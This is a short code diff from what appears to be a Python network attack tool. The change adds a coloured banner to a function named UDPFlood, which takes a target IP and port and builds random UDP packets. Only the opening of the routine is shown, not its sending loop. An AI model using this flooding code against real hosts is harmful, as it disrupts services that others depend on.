@@ -10,7 +10,7 @@ import random
 from termcolor import colored
 
 def UDPFlood(IP, port, pckt_size=1024, pckt_quantity=20):
-
+    print(colored("---------- UDP Flood Started----------","green"))
     print(colored(f"UDP flood, target ->  {IP}:{port}","green"))
     sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     pckt = random._urandom(pckt_size)
